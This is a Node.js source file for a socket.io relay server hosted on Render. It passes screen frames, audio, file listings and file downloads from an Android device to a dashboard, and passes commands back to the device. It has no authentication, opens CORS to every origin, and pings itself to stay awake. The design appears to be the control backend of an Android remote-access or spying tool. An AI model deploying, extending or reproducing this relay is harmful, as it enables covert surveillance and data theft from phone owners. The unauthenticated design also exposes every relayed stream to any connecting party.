const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// 1. CONFIGURATION
const PORT = process.env.PORT || 3000;
// REPLACE THIS with your actual Render URL once deployed
const RENDER_EXTERNAL_URL = "https://your-app-name.onrender.com"; 

// 2. MIDDLEWARE & HEALTH CHECK
// This prevents the "Port scan timeout" error on Render
app.get('/', (req, res) => {
    res.send('Server is Online and Awake');
});

// 3. SOCKET.IO SETUP
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    // Increased to 20MB to handle high-quality screen frames and file transfers
    maxHttpBufferSize: 2e7 
});

// 4. SOCKET EVENT HANDLING
io.on('connection', (socket) => {
    console.log(`Connected: ${socket.id}`);

    // Receive Screen Stream from Android and broadcast to Dashboard
    socket.on('data-stream', (data) => {
        socket.broadcast.emit('data-stream', data);
    });

    // Receive Audio Stream
    socket.on('audio-stream', (data) => {
        socket.broadcast.emit('audio-stream', data);
    });

    // File Explorer: List files
    socket.on('file-list', (data) => {
        socket.broadcast.emit('file-list', data);
    });

    // File Explorer: Download data
    socket.on('file-download', (data) => {
        socket.broadcast.emit('file-download', data);
    });

    // Forward commands from Dashboard to Android Device
    socket.on('command', (cmd) => {
        console.log(`Command sent: ${cmd}`);
        socket.broadcast.emit('command', cmd);
    });

    socket.on('disconnect', () => {
        console.log(`Disconnected: ${socket.id}`);
    });
});

// 5. KEEP-ALIVE SELF-PING (Every 10 minutes)
setInterval(() => {
    if (RENDER_EXTERNAL_URL.includes("onrender.com")) {
        https.get(RENDER_EXTERNAL_URL, (res) => {
            console.log(`Self-Ping Status: ${res.statusCode}`);
        }).on('error', (err) => {
            console.error(`Self-Ping Error: ${err.message}`);
        });
    }
}, 600000); // 600,000ms = 10 minutes

// 6. START SERVER
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port: ${PORT}`);
});
